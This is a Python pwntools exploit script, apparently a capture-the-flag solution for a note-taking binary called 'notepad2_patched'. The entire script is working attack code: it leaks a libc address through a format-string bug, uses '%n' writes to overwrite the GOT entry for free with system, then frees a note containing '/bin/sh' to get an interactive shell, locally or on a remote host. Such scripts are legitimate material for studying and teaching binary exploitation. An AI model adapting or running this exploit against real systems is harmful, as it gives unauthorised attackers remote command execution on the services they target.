from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
'''.format(**locals())

exe = './notepad2_patched'
elf = context.binary = ELF(exe, checksec=False)
context(terminal=['tmux', 'split-window', '-h'], binary=elf, log_level='info')
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)


def create(io, idx, payload):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'> ', str(idx).encode('utf-8'))
    io.sendlineafter(b'> ', payload)


def view(io, idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'> ', str(idx).encode('utf-8'))


def remove(io, idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'> ', str(idx).encode('utf-8'))

# Leak addresses

# for i in range(100):
#     try:
#         io = start()
#         create(io, 0, '%{}$p'.format(i))
#         view(io, 0)
#         leak = io.recvline().strip()
#         remove(io, 0)
#         print(f'{i}: ' + str(leak))
#         io.close()
#     except EOFError:
#         pass

# 8th offset pointing to 12
# 40th offset pointing to 46
# 13th offset pointing to libc


io = start()

# Leak libc address
create(io, 0, b'%13$p')
view(io, 0)

leak = int(io.recvuntil(b'Choose')[:-8], 16)
libc.address = leak - 0x28150
system = libc.sym['system']

log.success("Libc leak: %#x", leak)
log.success("Libc base address: %#x", libc.address)
log.success("System address: %#x", system)

# Write got free address at 12th position via position 8
payload = b"%x" * 6
payload += b"%4210668x"
payload += b"%n"

create(io, 1, payload)
view(io, 1)

# Write got free address + 3 at 46th position via position 40
payload = b"%x" * 38
payload += b"%4210503x"
payload += b"%n"

create(io, 2, payload)
view(io, 2)

high = ((system & 0xffffff000000) >> 24)
low = (system & 0xffffff)

payloadlow = f"%{low}x%12$n"
payloadhigh = f"%{high}x%46$n"

# Overwrite free with system
create(io, 3, str(payloadlow).encode())
create(io, 4, str(payloadhigh).encode())
view(io, 3)
view(io, 4)

# Create new note and submit /bin/sh, then remove note to call system(/bin/sh)
create(io, 5, b'/bin/sh')
remove(io, 5)

io.interactive()
